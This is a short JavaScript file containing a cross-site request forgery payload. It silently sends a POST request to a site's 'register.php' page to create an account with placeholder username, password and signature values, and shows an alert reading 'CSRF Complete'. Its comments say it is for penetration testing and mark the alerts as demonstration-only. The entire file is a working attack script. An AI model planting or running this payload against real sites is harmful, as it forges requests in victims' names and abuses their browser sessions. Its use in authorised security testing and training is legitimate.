var lXMLHTTP; 
try{
	var lUsername = "<USERNAME GOES HERE>";
	var lPassword = "<PASSWORD GOES HERE>";
	var lSignature = "<SIGNATURE GOES HERE>";
	var lData = "username="+lUsername+"&password="+lPassword+"&confirm_password="+lPassword+"&my_signature="+lSignature+"&register-php-submit-button=Create+Account";
	var lAction = "./index.php?page=register.php";
	var lMethod = "POST";

	try {
		lXMLHTTP = new ActiveXObject("Msxml2.XMLHTTP");
	}catch(e){ 
		try {
			lXMLHTTP = new ActiveXObject("Microsoft.XMLHTTP");
		}catch(e){
			try{
				lXMLHTTP = new XMLHttpRequest();
			}catch(e){
				alert(e.message);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST.
			}
		}
	}//end try

	lXMLHTTP.onreadystatechange = function(){
		if(lXMLHTTP.readyState == 4){
			alert("CSRF Complete");//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST.
		}
	};
	
	lXMLHTTP.open(lMethod, lAction, true);
	lXMLHTTP.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	lXMLHTTP.send(lData);
}catch(e){
	alert(e.message);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST.
}
